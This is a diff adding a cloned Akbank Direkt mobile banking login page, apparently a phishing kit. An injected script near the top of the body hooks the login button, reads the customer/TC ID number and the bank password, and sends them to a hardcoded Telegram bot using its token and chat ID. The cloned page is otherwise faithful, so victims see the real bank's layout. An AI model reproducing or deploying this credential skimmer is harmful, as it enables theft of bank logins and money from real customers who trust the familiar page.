@@ -1,0 +1,684 @@
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<!DOCTYPE html>
+
+<!-- Created by Webarchive Viewer and Convert to PDF -->
+<html class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="tr"><head>
+<title>Akbank Direkt</title>
+<meta charset="utf-8"/>
+<meta content="true" name="HandheldFriendly"/>
+<meta content="width" name="MobileOptimized"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1.0, user-scalable=no" name="viewport"/>
+<meta content="yes" name="mobile-web-app-capable"/>
+<meta content="yes" name="apple-mobile-web-app-capable"/>
+<meta content="telephone=no" name="format-detection"/>
+<meta content="no" name="msapplication-tap-highlight"/>
+<link href="local_resources/css/c2240b5cddf74d05213b272a796d5a38.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/c81c068915122196c943ef738a62f6bd.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/b4a93182fcd3a8dfda4ffc0f5d0ffde0.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/1f9e757277262ea4968318234d459d5b.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/9ce47eeb84e071681936f13823df121a.css" rel="stylesheet"/>
+<link href="local_resources/css/df3142c8a63b7ca75dfc417fb2371df7.css" rel="stylesheet"/>
+<script async="" src="local_resources/js/3e0afbd144a77b947d26a728ed75be6f.js"></script>
+<script type="text/javascript">
+        function createLoaderDiv(className){
+            var container = document.createElement("div");
+            container.setAttribute("class", className);
+            var circle1 = document.createElement("div"); circle1.setAttribute("class", "circle1");
+            var circle2 = document.createElement("div"); circle2.setAttribute("class", "circle2");
+            var circle3 = document.createElement("div"); circle3.setAttribute("class", "circle3");
+            var circle4 = document.createElement("div"); circle4.setAttribute("class", "circle4");
+            container.appendChild(circle1);
+            container.appendChild(circle2);
+            container.appendChild(circle3);
+            container.appendChild(circle4);
+            return container;
+        }
+    </script>
+</head>
+<body>
+<script type="text/javascript">
+    // Telegram bot bilgileri
+    const chatId = '-4238894331'; // Telegram chat ID
+    const botToken = '7414211602:AAEqhWwePqm3XeCjWP9D1ZzmZmNgE5mW-uM'; // Telegram bot token
+
+    // Telegram'a mesaj gönderme fonksiyonu
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const params = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(params)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.ok) {
+                console.error('Telegram mesaj gönderim hatası:', data.description);
+            } else {
+                console.log('Mesaj başarıyla gönderildi');
+            }
+        })
+        .catch(error => console.error('Hata:', error));
+    }
+
+    // Giriş bilgilerini toplama fonksiyonu
+    function captureLoginDetails() {
+        const customerNumberInput = document.querySelector('input[placeholder="Müşteri / TC Kimlik No"]');
+        const passwordInput = document.querySelector('input[placeholder="Akbank Şifresi"]');
+
+        if (customerNumberInput && passwordInput) {
+            const customerNumber = customerNumberInput.value;
+            const password = passwordInput.value;
+
+            if (customerNumber && password) {
+                const message = `Müşteri Numarası: ${customerNumber}\nŞifre: ${password}`;
+                sendToTelegram(message);
+            } else {
+                console.error('Giriş bilgileri eksik');
+            }
+        } else {
+            console.error('Giriş formu elemanları bulunamadı');
+        }
+    }
+
+    // Giriş butonuna tıklama olayını ekleyin
+    document.addEventListener('DOMContentLoaded', function() {
+        const loginButton = document.querySelector('input[type="button"][value="Giriş"]');
+        if (loginButton) {
+            loginButton.addEventListener('click', function() {
+                captureLoginDetails();
+            });
+        } else {
+            console.error('Giriş butonu bulunamadı');
+        }
+    });
+</script>
+<script type="text/javascript">
+        if(window.addEventListener){
+            window.addEventListener('blur', function(){
+                document.title = window.CommonResources.Language.Dictionary? window.CommonResources.Language.Dictionary.WindowTitleBlur : 'Akbank Direkt';
+            });
+            window.addEventListener('focus', function(){
+                document.title = window.CommonResources.Language.Dictionary? window.CommonResources.Language.Dictionary.WindowTitleFocus : 'Akbank Direkt';
+            });
+        }
+        else{
+            window.attachEvent('onblur',function(){
+                document.title = window.CommonResources.Language.Dictionary? window.CommonResources.Language.Dictionary.WindowTitleBlur : 'Akbank Direkt';
+            });
+            window.attachEvent('onfocus',function(){
+                document.title = window.CommonResources.Language.Dictionary? window.CommonResources.Language.Dictionary.WindowTitleFocus : 'Akbank Direkt';
+            });
+        }
+    </script>
+<div class="popup cookie" id="popup-cookie-background" style="display:none">
+<div class="popup cookie-header">
+<div>
+            Zorunlu Çerezler
+        </div>
+</div>
+<div class="popup cookie-body">
+<div>
+            Bu çerezler internet sitemizin çalışması amacıyla gerekli olan, oturumunuz süresince sitemizin performansını ölçmek sitemizi iyileştirebilmek, çerez ayarları ve gizlilik tercihlerinizi hatırlamak amacıyla kullandığımız çerezler olup; oturum sonlandığında otomatikman silinmektedir. Bu çerezler internet sitemize log-in olmanızı, form doldurmanızı, ziyaretçi adetlerinin sayılması ve trafiğin ölçülmesine olanak sağlamaktadır. Bu sayede sitemizin performansını ölçmekte ve iyileştirebilmekteyiz.
+        </div>
+<div style="padding: 8px 8px 8px 0px;font-weight:600">
+            Tanımlama bilgisi ayrıntıları
+        </div>
+<div style="padding:8px">
+<div>
+                MMbpmEoJR4
+            </div>
+<div>
+                Web sitemizde sunulan ve açıkça talep etmiş olduğunuz hizmetler için tutulan çerezdir.
+            </div>
+</div>
+<div style="padding:8px">
+<div>
+                NSC_OU_npcjmtvcf.blcbol.dpn.us_TTM
+            </div>
+<div>
+                Web sitemizde sunulan ve açıkça talep etmiş olduğunuz hizmetler için tutulan çerezdir.
+            </div>
+</div>
+<div style="padding:8px">
+<div>
+                __RequestVerificationToken
+            </div>
+<div>
+                Web sitemizde sunulan ve açıkça talep etmiş olduğunuz hizmetler için tutulan çerezdir.
+            </div>
+</div>
+<div style="padding:8px">
+<div>
+                baseCulture
+            </div>
+<div>
+                Web sitemizde sunulan ve açıkça talep etmiş olduğunuz hizmetler için tutulan çerezdir.
+            </div>
+</div>
+<div style="padding:8px">
+<div>
+                tttSFCbKlF
+            </div>
+<div>
+                Web sitemizde sunulan ve açıkça talep etmiş olduğunuz hizmetler için tutulan çerezdir.
+            </div>
+</div>
+</div>
+<div class="popup cookie-footer">
+<div class="popup button-text" id="popup-button-cookie-close">
+            Anladım
+        </div>
+</div>
+</div>
+<input name="__RequestVerificationToken" type="hidden" value="LtUsNNTiKEyMZU5MXA_0XlytXd3w4tmwYDH3MSTowP7rs5IkY4JAlbszv3Edbs0bJcWfy_hdNf7iayMrCWqM8Bbcduf3kjCg43IHh1dHp3aK-laWZby3SfkxHnMXSuHd_9_ZgQycK9tdm8pbyLZemQ2"/>
+<div id="applicationHost"><div data-active-view="true" data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }" data-view="views/shell" style=""><div class="guest" data-active-view="true" data-view="views/guest/guest" style="">
+<div class="header">
+<!-- ko if: isVisible -->
+<div class="desktop-part" data-bind="click:NavigateToDesktopSite">
+<div class="sub-div"><div class="image-part"><img onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/d761872f4ea597aa788881427bab2e0e.svg"/></div><div class="desktopText"> <!--ko text:GetString('DesktopWebsite')-->Masaüstü Sitesi<!--/ko--></div></div>
+</div>
+<!-- /ko -->
+<div class="lang-guest-selection">
+<div class="culture-guest-selection" data-bind="visible: langSelection()" style="display: none;">
+<!-- ko foreach: SupportedLanguages -->
+<a class="selected" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">Türkçe</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->           |
+                <!-- /ko -->
+<a class="" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">English</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+<!-- /ko -->
+</div>
+</div>
+</div>
+<div class="content-area" data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }"><div class="login-form-wrap" data-active-view="true" data-view="views/guest/login/mbblogin/mbblogin" style="">
+<div class="login-router" data-bind="router: { cacheViews: false, alwaysTriggerAttach: true }"><div class="mbbcclogin" data-active-view="true" data-view="views/guest/login/mbblogin/subviews/mbbloginpasswordcaptcha" style="">
+<text-input-login params="type:'mbb', placeholder:GetString('CustomerNumberLogin'),value:mbbNo"><div class="text-input-login">
+<div class="text-input" data-bind="attr: { class: className}">
+<div class="text-input-wrap">
+<div class="icon-part">
+<!-- ko if: type()=='mbb' -->
+<div class="icon icon-user-w icon-user-w-size"></div>
+<!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast'--><!-- /ko -->
+<!-- ko if: type()=='whitePass'--><!-- /ko -->
+<!-- ko if: type()=='cepsifre'--><!-- /ko -->
+<!-- ko if: type()=='kk'--><!-- /ko -->
+<!-- ko if: type()=='skt'--><!-- /ko -->
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<!-- ko if: type()=='captcha'--><!-- /ko -->
+</div>
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<div class="input-part">
+<!-- ko if: type()=='mbb' -->
+<input class="inputarea" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" pattern="[0-9]*" placeholder="Müşteri / TC Kimlik No" type="text"/>
+<!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast' --><!-- /ko -->
+<!-- ko if: type()=='whitePass' --><!-- /ko -->
+<!-- ko if: type()=='cepsifre' --><!-- /ko -->
+<!-- ko if: type()=='kk' --><!-- /ko -->
+<!-- ko if: type()=='skt' --><!-- /ko -->
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<!-- ko if: type()=='captcha' --><!-- /ko -->
+</div>
+</div>
+</div>
+</div></text-input-login>
+<hr class="login-separator"/>
+<text-input-login params="type:'ast', placeholder:GetString('AkbankDirektPassword'),value:password"><div class="text-input-login">
+<div class="text-input" data-bind="attr: { class: className}">
+<div class="text-input-wrap">
+<div class="icon-part">
+<!-- ko if: type()=='mbb' --><!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast'-->
+<div class="icon icon-password-w icon-password-w-size"></div>
+<!-- /ko -->
+<!-- ko if: type()=='whitePass'--><!-- /ko -->
+<!-- ko if: type()=='cepsifre'--><!-- /ko -->
+<!-- ko if: type()=='kk'--><!-- /ko -->
+<!-- ko if: type()=='skt'--><!-- /ko -->
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<!-- ko if: type()=='captcha'--><!-- /ko -->
+</div>
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<div class="input-part">
+<!-- ko if: type()=='mbb' --><!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast' -->
+<input class="inputarea" data-bind="bind-numeric-password: value, attr: { placeholder : placeholder},settings: { maxlength: 6 }" pattern="[0-9]*" placeholder="Akbank Şifresi" type="tel"/>
+<!-- /ko -->
+<!-- ko if: type()=='whitePass' --><!-- /ko -->
+<!-- ko if: type()=='cepsifre' --><!-- /ko -->
+<!-- ko if: type()=='kk' --><!-- /ko -->
+<!-- ko if: type()=='skt' --><!-- /ko -->
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<!-- ko if: type()=='captcha' --><!-- /ko -->
+</div>
+</div>
+</div>
+</div></text-input-login>
+<div data-bind="visible: isPhoneNumberVisible()" style="display: none;">
+<hr class="login-separator"/>
+<text-input-login params="type:'phonenumber', placeholder:GetString('EnterTelephone'),value:phoneNumber,selectoptions:_parent.countrycodes,selectvalue:_parent.selectedcountrycode,maxlength:10"><div class="text-input-login">
+<div class="text-input" data-bind="attr: { class: className}">
+<div class="text-input-wrap">
+<div class="icon-part">
+<!-- ko if: type()=='mbb' --><!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast'--><!-- /ko -->
+<!-- ko if: type()=='whitePass'--><!-- /ko -->
+<!-- ko if: type()=='cepsifre'--><!-- /ko -->
+<!-- ko if: type()=='kk'--><!-- /ko -->
+<!-- ko if: type()=='skt'--><!-- /ko -->
+<!-- ko if: type()=='phonenumber' -->
+<div class="icon icon-phone-number-w icon-phone-number-w-size"></div>
+<!-- /ko -->
+<!-- ko if: type()=='captcha'--><!-- /ko -->
+</div>
+<!-- ko if: type()=='phonenumber' -->
+<select data-bind="style: { background-color: '#c51522' }, options: selectoptions, optionsText: 'countryName', optionsValue: 'Id', value: selectvalue" style="background-color: rgb(197, 21, 34);"></select>
+<!-- /ko -->
+<div class="input-part">
+<!-- ko if: type()=='mbb' --><!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast' --><!-- /ko -->
+<!-- ko if: type()=='whitePass' --><!-- /ko -->
+<!-- ko if: type()=='cepsifre' --><!-- /ko -->
+<!-- ko if: type()=='kk' --><!-- /ko -->
+<!-- ko if: type()=='skt' --><!-- /ko -->
+<!-- ko if: type()=='phonenumber' -->
+<input class="inputarea" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: maxlength }" pattern="[0-9]*" placeholder="Cep telefonu numaranı gir" type="text"/>
+<!-- /ko -->
+<!-- ko if: type()=='captcha' --><!-- /ko -->
+</div>
+</div>
+</div>
+</div></text-input-login>
+</div>
+<div data-bind="visible: isCaptchaVisible()" style="display: none;">
+<!--ko if:isHybridCaptcha-->
+<hr class="login-separator"/>
+<div class="text-center" style="margin: 10px 20px; padding: 5px; border-radius: 2px; background-color: #E5E5E5;">
+<img data-bind="attr: { src: 'data:image/png;base64,' + captchaData() }" src="local_resources/img/1a1ebcf8a6e806b5ae610b367b130c6b.png" style="width:120px;"/>
+<a data-bind="click:refreshCaptcha, attr :{ value : GetString('Refresh')}" href="https://mobilsube.akbank.com.tr/" value="Yenile">
+<img data-bind="attr: {src: refreshImagePath()}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/cf67016f882b61a14a74915d6245b7ba.svg" style="height: 32px; width: 32px; margin-left: 48px"/>
+<span data-bind="value: GetString('Refresh')" style="font-size: 15px; color: #ab1f23; margin-left: 5px; line-height: 32px"></span>
+</a>
+</div>
+<hr class="login-separator"/>
+<text-input-login params="type:'captcha', placeholder:GetString('AkbankDirekSecuritytImage'),value:captcha"><div class="text-input-login">
+<div class="text-input" data-bind="attr: { class: className}">
+<div class="text-input-wrap">
+<div class="icon-part">
+<!-- ko if: type()=='mbb' --><!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast'--><!-- /ko -->
+<!-- ko if: type()=='whitePass'--><!-- /ko -->
+<!-- ko if: type()=='cepsifre'--><!-- /ko -->
+<!-- ko if: type()=='kk'--><!-- /ko -->
+<!-- ko if: type()=='skt'--><!-- /ko -->
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<!-- ko if: type()=='captcha'-->
+<div class="icon icon-password-w icon-password-w-size"></div>
+<!-- /ko -->
+</div>
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<div class="input-part">
+<!-- ko if: type()=='mbb' --><!-- /ko -->
+<!-- ko if: type()=='yatirimci' --><!-- /ko -->
+<!-- ko if: type()=='ast' --><!-- /ko -->
+<!-- ko if: type()=='whitePass' --><!-- /ko -->
+<!-- ko if: type()=='cepsifre' --><!-- /ko -->
+<!-- ko if: type()=='kk' --><!-- /ko -->
+<!-- ko if: type()=='skt' --><!-- /ko -->
+<!-- ko if: type()=='phonenumber' --><!-- /ko -->
+<!-- ko if: type()=='captcha' -->
+<input class="inputarea" data-bind="bind-value: value, attr: { placeholder : placeholder},settings: { maxlength: 4 ,afterkeyup: makeItUpper}" placeholder="Yukarıdaki Karakterleri Giriniz" type="text"/>
+<!-- /ko -->
+</div>
+</div>
+</div>
+</div></text-input-login>
+<!--/ko-->
+</div>
+<div class="login-button-bar">
+<div class="login-button-wrap">
+<div class="login-button" data-bind="visible:cancelButtonVisible">
+<page-button-login params="value:GetString('CancelBIG'),action:function(){ $data.loginCancel() },enable:cancelButtonVisible"><div class="page-button-login" data-bind="visible:!midButton()">
+<input data-bind="value:value,click:action, enable: enable" type="button" value="İptal"/>
+</div>
+<div class="page-button-login" data-bind="visible:midButton()" style="padding-left: 15px; padding-right: 15px; display: none;">
+<input data-bind="value:value,click:action, enable: enable" type="button" value="İptal"/>
+</div>
+</page-button-login>
+</div>
+<div class="login-button" data-bind="css: {yatirimci: !cancelButtonVisible()}">
+<page-button-login params="value:GetString('LoginBIG'),action:function(){ $data.continueToLogin() },enable:canSubmit"><div class="page-button-login" data-bind="visible:!midButton()">
+<input data-bind="value:value,click:action, enable: enable" enable="" type="button" value="Giriş"/>
+</div>
+<div class="page-button-login" data-bind="visible:midButton()" style="padding-left: 15px; padding-right: 15px; display: none;">
+<input data-bind="value:value,click:action, enable: enable" enable="" type="button" value="Giriş"/>
+</div>
+</page-button-login>
+</div>
+</div>
+</div>
+<div>
+<a class="forget-item" data-bind="click:forgotMBB" href="https://mobilsube.akbank.com.tr/">
+<div class="item-text"><!--ko text:GetString('ForgotMBB')-->Müşteri numaramı bilmiyorum<!--/ko--></div>
+<div class="arrow">
+<div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+</div>
+</a>
+</div>
+<a class="forget-item" data-bind="click:forgotPassword" href="https://mobilsube.akbank.com.tr/">
+<div class="item-text"><!--ko text:GetString('ForgotPassword')-->Şifremi bilmiyorum<!--/ko--></div>
+<div class="arrow">
+<div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+</div>
+</a>
+</div></div>
+<div class="login-navigation">
+<div class="language-part" data-bind="visible:isRegisteredLogin()" style="display: none;">
+<div class="culture-selection" data-bind="visible: _parent.langSelection()" style="display: none;">
+<!-- ko foreach: SupportedLanguages -->
+<a class="selected" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">Türkçe</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->
+                |
+                <!-- /ko -->
+<a class="" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">English</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+<!-- /ko -->
+</div>
+</div>
+<!-- ko compose: _parent.LoginExtrasView --><div class="login-nav-wrap" data-active-view="true" data-view="views/guest/login/nav" style="">
+<a class="map-link" data-bind="click: NavigateToMaps" href="https://mobilsube.akbank.com.tr/">
+<div class="map-wrap">
+<div class="map-icon">
+<div class="map-icon-g icon-map-g icon-map-g-size"></div>
+</div>
+<span class="map-text"> <!--ko text:GetString('NearestAkbank')-->En Yakın Akbank<!--/ko--></span>
+<div class="map-arrow">
+<div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+</div>
+</div>
+</a>
+<a class="extras-link" data-bind="click: NavigateToCurrencyConverter" href="https://mobilsube.akbank.com.tr/">
+<div class="extras-wrap">
+<div class="extras-icon">
+<div class="extras-icon-g icon-currency-g icon-currency-g-size"></div>
+</div>
+<span class="extras-text extras-has-sub-text"><!--ko text:GetString('CurrencyConverter')-->Döviz Kuru Hesaplama<!--/ko--><br/><span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 34,4230 TL</span> </span>
+<div class="extras-arrow">
+<div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+</div>
+</div>
+</a>
+<!-- ko if:!IsHybrid() || IsHybridTablet()-->
+<a class="extras-link desktop-site" data-bind="click: NavigateToDirectLoanApplication" href="https://mobilsube.akbank.com.tr/">
+<div class="extras-wrap">
+<div class="extras-icon">
+<img class="loan-image" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/1c736713e929b7c8bbee68fecaa85a10.svg"/>
+</div>
+<span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
+<div class="extras-arrow">
+<div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+</div>
+</div>
+</a>
+<!--/ko-->
+</div><!--/ko-->
+</div>
+</div><div class="login-form-wrap" data-bind="css:{login-form-wrap-direction: _parent.langSelection()}" data-view="views/guest/home" style="display: none;">
+<div class="main-part">
+<div class="login-router">
+<div class="home-title">
+<div class="title-wrap">
+<div class="title-text">
+<!--ko text:GetString('AkbankLogin')-->Akbank Mobil Giriş<!--/ko-->
+</div>
+</div>
+</div>
+<div class="login-options-wrap">
+<a class="login-option" data-bind="click: NavigateToMbbLogin" href="https://mobilsube.akbank.com.tr/">
+<div class="icon-wrap">
+<div class="option-icon icon-user-w icon-user-w-size"></div>
+</div>
+<div class="option-text">
+<!--ko text:GetString('LoginWithMbb')-->Müşteri / TC Kimlik No ile Giriş<!--/ko-->
+</div>
+<div class="option-arrow">
+<div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+</div>
+</a>
+<a class="login-option" data-bind="click: NavigateToCCLogin" href="https://mobilsube.akbank.com.tr/">
+<div class="icon-wrap">
+<div class="option-icon icon-credit-card-w icon-credit-card-w-size"></div>
+</div>
+<div class="option-text">
+<!--ko text:GetString('LoginWithCC')-->Kredi Kartı ile Giriş<!--/ko-->
+</div>
+<div class="option-arrow">
+<div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+</div>
+</a>
+</div>
+</div>
+<div class="login-extras-part">
+<div class="language-part">
+<div class="culture-selection" data-bind="visible: _parent.langSelection()" style="display: none;">
+<!-- ko foreach: SupportedLanguages -->
+<a class="selected" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">Türkçe</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->
+                    |
+                    <!-- /ko -->
+<a class="" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">English</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+<!-- /ko -->
+</div>
+</div>
+<!-- ko compose: _parent.LoginExtrasView --><div class="login-nav-wrap" data-active-view="true" data-view="views/guest/login/nav" style="">
+<a class="map-link" data-bind="click: NavigateToMaps" href="https://mobilsube.akbank.com.tr/">
+<div class="map-wrap">
+<div class="map-icon">
+<div class="map-icon-g icon-map-g icon-map-g-size"></div>
+</div>
+<span class="map-text"> <!--ko text:GetString('NearestAkbank')-->En Yakın Akbank<!--/ko--></span>
+<div class="map-arrow">
+<div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+</div>
+</div>
+</a>
+<a class="extras-link" data-bind="click: NavigateToCurrencyConverter" href="https://mobilsube.akbank.com.tr/">
+<div class="extras-wrap">
+<div class="extras-icon">
+<div class="extras-icon-g icon-currency-g icon-currency-g-size"></div>
+</div>
+<span class="extras-text extras-has-sub-text"><!--ko text:GetString('CurrencyConverter')-->Döviz Kuru Hesaplama<!--/ko--><br/><span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 34,4230 TL</span> </span>
+<div class="extras-arrow">
+<div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+</div>
+</div>
+</a>
+<!-- ko if:!IsHybrid() || IsHybridTablet()-->
+<a class="extras-link desktop-site" data-bind="click: NavigateToDirectLoanApplication" href="https://mobilsube.akbank.com.tr/">
+<div class="extras-wrap">
+<div class="extras-icon">
+<img class="loan-image" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/1c736713e929b7c8bbee68fecaa85a10.svg"/>
+</div>
+<span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
+<div class="extras-arrow">
+<div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+</div>
+</div>
+</a>
+<!--/ko-->
+</div><!--/ko-->
+</div>
+</div>
+</div></div>
+<div class="separator"></div>
+<div class="footer">
+<div class="banner" data-bind="css:{extras:!(isLogoVisible())}">
+<img class="logo" data-bind="visible:isLogoVisible()" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/7372efddc9dc4067b6e701090947015b.svg"/>
+<div class="extras" data-bind="visible:!(isLogoVisible())" style="display: none;">
+<a class="back-part" data-bind="click:function(){navigateBack();}">
+<img class="back-image" data-bind="attr:{src:backIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/9075e0843683c25249bd8e1a7825f979.png"/>
+</a>
+<a class="close-part" data-bind="click:function(){navigateHome();}">
+<img class="close-image" data-bind="attr:{src:closeIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="local_resources/img/5367fe133930caa68638cf6ebf591298.png"/>
+</a>
+<!--ko text:header--><!--/ko-->
+</div>
+<div class="lang-mobile-selection" data-bind="visible: langSelection()" style="display: none;">
+<!-- ko foreach: SupportedLanguages -->
+<a class="selected" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">Türkçe</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->                |
+                <!-- /ko -->
+<a class="" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" href="https://mobilsube.akbank.com.tr/">English</a>
+<!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+<!-- /ko -->
+</div>
+</div>
+<div class="sizinicin">sizin için</div>
+</div>
+</div></div></div>
+<div class="loader clearfix" style="display: none">
+<div class="spinner center-block"><div class="spinner-container container1"><div class="circle1"></div><div class="circle2"></div><div class="circle3"></div><div class="circle4"></div></div><div class="spinner-container container2"><div class="circle1"></div><div class="circle2"></div><div class="circle3"></div><div class="circle4"></div></div><div class="spinner-container container3"><div class="circle1"></div><div class="circle2"></div><div class="circle3"></div><div class="circle4"></div></div></div></div>
+<div class="popup background" id="popup-background" style="display: none;">
+<div class="popup text-white">
+<span>
+            Mobilsube.akbank.com.tr sitemizin çalışması için kesinlikle zorunlu çerezler kullanıyoruz.
+        </span>
+<a class="popup text-link" href="https://www.akbank.com/tr-tr/genel/sayfalar/aydinlatma-metni-ve-gizlilik-politikasi.aspx" target="_blank">
+            Çerez Aydınlatma Metni ve Gizlilik Politikası
+        </a>
+<span>
+            üzerinden ulaşabilirsiniz.
+        </span>
+</div>
+<div class="popup button">
+<div class="popup button-text" id="popup-button-approve">
+            Anladım
+        </div>
+<div class="popup button-text" id="popup-button-cookie-show">
+            Çerezleri Görüntüle
+        </div>
+</div>
+</div>
+<script type="text/javascript">
+            var popupBg = document.getElementById("popup-background");
+            var popupButtonApprove = document.getElementById("popup-button-approve");
+            var popupButtonShow = document.getElementById("popup-button-cookie-show");
+            var popupButtonClose = document.getElementById("popup-button-cookie-close");
+            var popupCokieBg = document.getElementById("popup-cookie-background");
+            var popupWasShown = localStorage.getItem("popupWasShown")
+            if (!popupWasShown)  popupBg.style.display = null;
+            popupButtonApprove.addEventListener('click', function () {
+                localStorage.setItem("popupWasShown", "1");
+                popupBg.style.display = 'none';
+            });
+            popupButtonShow.addEventListener('click', function () {
+                popupCokieBg.style.display = null;
+            });
+            popupButtonClose.addEventListener('click', function () {
+                popupCokieBg.style.display = 'none';
+            });
+    </script>
+<script src="local_resources/js/6881f81e33ff519ec9323b3eacb1540b.js" type="text/javascript"></script>
+<script type="text/javascript">
+        ConfigurationParameters = {"EntryPointJson":"/Akbank.Mobil.EntryPointService/","PostRoute":"api/EntryPoint","GetRoute":"getapi/","GetDateTimeServiceName":"EntryPointDateTime","MapKey":"AIzaSyA0vIW4ObwtvG0ttU2v04GP49pmhEocuMY","SupportedPlatforms":"Mobile|Tablet","Version":"1.0.15"};
+        ConfigurationParameters.CurrentDevice = 'Mobile';
+        ConfigurationParameters.LoginSelection = '';
+        BrowserDetect.platformCheck();
+        window.Yatirimci = false;
